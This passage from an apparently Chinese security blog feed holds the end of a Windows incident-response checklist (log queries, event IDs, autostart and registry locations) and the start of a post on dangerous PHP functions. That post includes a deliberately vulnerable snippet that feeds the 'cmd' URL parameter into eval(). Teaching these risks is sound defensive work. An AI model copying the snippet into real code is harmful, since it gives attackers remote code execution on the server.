&lt;td&gt;LogParser.exe -i:EVT –o:DATAGRID “SELECT EXTRACT_TOKEN(Message,13,’ ‘)as&lt;br/&gt;EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,’|’) as&lt;br/&gt;Username,EXTRACT_TOKEN(Message,38,’ ‘) as Loginip FROM c:\Security.evtx where EventID=4624″&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;登录失败的所有事件&lt;/td&gt;
&lt;td&gt;LogParser.exe -i:EVT –o:DATAGRID “SELECT * FROM c:\Security.evtx where EventID=4625″&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;提取登录失败用户名进行聚合统计&lt;/td&gt;
&lt;td&gt;LogParser.exe -i:EVT “SELECT EXTRACT_TOKEN(Message,13,’ ‘) as &lt;br/&gt; as user,count(EXTRACT_TOKEN(Message,19,’ ‘)) as Times,EXTRACT_TOKEN(Message,39,’ ‘)   as Loginip FROM c:\Security.evtx where &lt;br/&gt; EventID=4625GROUP BY Message”&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;系统历史开关机记录&lt;/td&gt;
&lt;td&gt;LogParser.exe -i:EVT –o:DATAGRID “SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006″&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;常用事件 ID 含义&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Event ID(2000/XP/2003)&lt;/th&gt;
&lt;th&gt;Event ID(Vista/7/8/2008/2012)&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;th&gt;日志名称&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;528&lt;/td&gt;
&lt;td&gt;4624&lt;/td&gt;
&lt;td&gt;成功登录&lt;/td&gt;
&lt;td&gt;Security&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;529&lt;/td&gt;
&lt;td&gt;4625&lt;/td&gt;
&lt;td&gt;失败登录&lt;/td&gt;
&lt;td&gt;Security&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;680&lt;/td&gt;
&lt;td&gt;4776&lt;/td&gt;
&lt;td&gt;成功 / 失败的账户认证&lt;/td&gt;
&lt;td&gt;Security&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;624&lt;/td&gt;
&lt;td&gt;4720&lt;/td&gt;
&lt;td&gt;创建用户&lt;/td&gt;
&lt;td&gt;Security&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;636&lt;/td&gt;
&lt;td&gt;4732&lt;/td&gt;
&lt;td&gt;添加用户到启用安全性的本地组中&lt;/td&gt;
&lt;td&gt;Security&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;632&lt;/td&gt;
&lt;td&gt;4728&lt;/td&gt;
&lt;td&gt;添加用户到启用安全性的全局组中&lt;/td&gt;
&lt;td&gt;Security&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2934&lt;/td&gt;
&lt;td&gt;7030&lt;/td&gt;
&lt;td&gt;服务创建错误&lt;/td&gt;
&lt;td&gt;System&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2944&lt;/td&gt;
&lt;td&gt;7040&lt;/td&gt;
&lt;td&gt;IPSEC 服务服务的启动类型已从禁用更改为自动启动&lt;/td&gt;
&lt;td&gt;System&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2949&lt;/td&gt;
&lt;td&gt;7045&lt;/td&gt;
&lt;td&gt;服务创建&lt;/td&gt;
&lt;td&gt;System&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;登录类型 ID&lt;/p&gt;
&lt;p&gt;成功 / 失败登录事件提供的有用信息之一是用户 / 进程尝试登录（登录类型），但 Windows 将此信息显示为数字，下面是数字和对应的说明：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;录类型&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;登录类型&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;Interactive&lt;/td&gt;
&lt;td&gt;用户登录到本机&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;Network&lt;/td&gt;
&lt;td&gt;用户或计算手机从网络登录到本机，如果网络共享，或使用 net use 访问网络共享，net view 查看网络共享&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;Batch&lt;/td&gt;
&lt;td&gt;批处理登录类型，无需用户干预&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;Service&lt;/td&gt;
&lt;td&gt;服务控制管理器登录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;Unlock&lt;/td&gt;
&lt;td&gt;用户解锁主机&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;NetworkCleartext&lt;/td&gt;
&lt;td&gt;用户从网络登录到此计算机，用户密码用非哈希的形式传递&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;NewCredentials&lt;/td&gt;
&lt;td&gt;进程或线程克隆了其当前令牌，但为出站连接指定了新凭据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;td&gt;Remotelnteractive&lt;/td&gt;
&lt;td&gt;使用终端服务或远程桌面连接登录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;Cachedlnteractive&lt;/td&gt;
&lt;td&gt;用户使用本地存储在计算机上的凭据登录到计算机（域控制器可能无法验证凭据），如主机不能连接域控，以前使用域账户登录过这台主机，再登录就会产生这样日志&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;12&lt;/td&gt;
&lt;td&gt;CachedRemotelnteractive&lt;/td&gt;
&lt;td&gt;与 Remotelnteractive 相同，内部用于审计目的&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;13&lt;/td&gt;
&lt;td&gt;CachedUnlock&lt;/td&gt;
&lt;td&gt;登录尝试解锁&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;账号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#账号&#34;&gt;#&lt;/a&gt; 账号&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;新增用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;隐藏/克隆帐号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;管理员对应键值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lusrmgr.msc 查看账户变化&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net user 列出当前登录账户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic UserAccount get 列出当前系统所有账户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net localgroup administrators 列出管理员组用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;注册表-管理员键值：HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;D盾查杀&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;日志-登录时间/用户名&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;进程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#进程-2&#34;&gt;#&lt;/a&gt; 进程&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tasklist /svc | findstr pid  查看服务进行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;netstat -ano&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic process | find &amp;quot;Proccess Id&amp;quot; &amp;gt; proc.csv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell: Get-WmiObject -Class Win32_Process&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msinfo32 查看自己电脑配置详情&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;扩展powershell命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic &lt;span class=&#34;keyword&#34;&gt;process&lt;/span&gt; get caption,commandline /value&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic &lt;span class=&#34;keyword&#34;&gt;process&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;where&lt;/span&gt; caption=”svchost.exe” get caption,commandline /value&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic service get name,pathname,processid,startname,status,state /value&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic &lt;span class=&#34;keyword&#34;&gt;process&lt;/span&gt; get CreationDate,name,processid,commandline,ExecutablePath /value&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic &lt;span class=&#34;keyword&#34;&gt;process&lt;/span&gt; get name,processid,executablepath| findstr &lt;span class=&#34;string&#34;&gt;&amp;quot;7766&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;端口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口&#34;&gt;#&lt;/a&gt; 端口&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;netstat -ano&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;端口状态&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;CLOSED&lt;/td&gt;
&lt;td&gt;无连接活动或正在进行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;LISTEN&lt;/td&gt;
&lt;td&gt;监听中等待连接&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SYN_RECV&lt;/td&gt;
&lt;td&gt;服务端接收了 SYN&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SYN_SENT&lt;/td&gt;
&lt;td&gt;请求连接等待确认&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ESTABLISHED&lt;/td&gt;
&lt;td&gt;连接建立数据传输&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FIN_WAIT1&lt;/td&gt;
&lt;td&gt;请求中止连接，等待对方 FIN&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FIN_WAIT2&lt;/td&gt;
&lt;td&gt;同意中止，请稍候&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ITMED_WAIT&lt;/td&gt;
&lt;td&gt;等待所有分组死掉&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CLOSING&lt;/td&gt;
&lt;td&gt;两边同时尝试关闭&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TIME_WAIT&lt;/td&gt;
&lt;td&gt;另一边已初始化一个释放&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;LAST_ACK&lt;/td&gt;
&lt;td&gt;等待原来的发向远程 TCP 的连接中断请求的确认&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CLOSE-WAIT&lt;/td&gt;
&lt;td&gt;等待关闭连接&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;自启动-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#自启动-2&#34;&gt;#&lt;/a&gt; 自启动&lt;/h4&gt;
&lt;p&gt;注册表位置&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HKLM\Software\Microsoft\Windows\CurrentVersion\RunonceEx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(ProfilePath)\Start Menu\Programs\Startup 启动项&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell:startup  查看开机自启&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msconfig 启动选项卡&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gpedit.msc 组策略编辑器&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;开始&amp;gt;所有程序&amp;gt;启动&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic startup list full&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;计划任务-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#计划任务-2&#34;&gt;#&lt;/a&gt; 计划任务&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;C:\Windows\System32\Tasks\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\Windows\SysWOW64\Tasks\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C:\Windows\tasks\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;schtasks&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;taskschd.msc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;at&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;开始-设置-控制面板-任务计划&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;注册表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注册表&#34;&gt;#&lt;/a&gt; 注册表&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;注册表位置&lt;/th&gt;
&lt;th&gt;对应信息&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList&lt;/td&gt;
&lt;td&gt;临时配置文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HKLM\SAM\Domains\Account\&lt;/td&gt;
&lt;td&gt;用户信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hklm:\Software\Microsoft\Windows\CurrentVersion\policies\system&lt;/td&gt;
&lt;td&gt;UAC 注册表位置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hklm:\Software\Microsoft\Active Setup\Installed Components&lt;/td&gt;
&lt;td&gt;安装的组件信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hklm:\Software\Microsoft\Windows\CurrentVersion\App Paths&lt;/td&gt;
&lt;td&gt;软件环境变量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hklm:\software\microsoft\windows nt\CurrentVersion\winlogon&lt;/td&gt;
&lt;td&gt;系统启动&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hklm:\software\microsoft\security center\svc&lt;/td&gt;
&lt;td&gt;安全中心报警&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hkcu:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths&lt;/td&gt;
&lt;td&gt;让源管理器中的地址栏不记录文件的打开记录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hkcu:\Software\Microsoft\Windows\CurrentVersion\explorer\RunMru&lt;/td&gt;
&lt;td&gt;禁止自动保存运行记录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hklm:\Software\Microsoft\Windows\CurrentVersion\explorer\Startmenu&lt;/td&gt;
&lt;td&gt;软件自动启动项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hklm:\System\CurrentControlSet\Control\Session Manager&lt;/td&gt;
&lt;td&gt;装载 Win32 子系统内核模式部分&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hkcu:\Software\Microsoft\Internet Explorer\Extensions&lt;/td&gt;
&lt;td&gt;记录最后下载软件的存储位置&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hklm:\Software\Microsoft\Windows\CurrentVersion\ShellExtensions\Approved&lt;/td&gt;
&lt;td&gt;系统或者用户已注册的外壳扩展功能模块&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hklm:\System\CurrentControlSet\Control\Session Manager\AppCertDlls&lt;/td&gt;
&lt;td&gt;后门及持久化访问&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;本文内容借鉴：应急响应实战 checklist pdf&lt;/p&gt;
&lt;p&gt;博客：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjUyNA==&#34;&gt;https://xz.aliyun.com/t/2524&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</guid>
            <title>php危险函数</title>
            <link>https://chungod.github.io/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</link>
            <category>php危险函数</category>
            <pubDate>Tue, 04 May 2021 12:34:41 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;php常见危险函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php常见危险函数&#34;&gt;#&lt;/a&gt; PHP 常见危险函数&lt;/h2&gt;
&lt;h3 id=&#34;eval函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#eval函数&#34;&gt;#&lt;/a&gt; eval () 函数&lt;/h3&gt;
&lt;p&gt;定义和用法：&lt;/p&gt;
&lt;p&gt;eval () 函数把字符串按照 PHP 代码来计算.&lt;br&gt;
 该字符串必须是合法的 PHP 代码，且必须以分号结尾。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;var&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$arg&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\$var = &lt;span class=&#34;subst&#34;&gt;$arg&lt;/span&gt;;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\$var =&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503102521525.png&#34; alt=&#34;image-20210503102521525&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503102807857.png&#34; alt=&#34;image-20210503102807857&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;assert函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#assert函数&#34;&gt;#&lt;/a&gt; &lt;strong&gt;assert () 函数&lt;/strong&gt;&lt;/h3&gt;
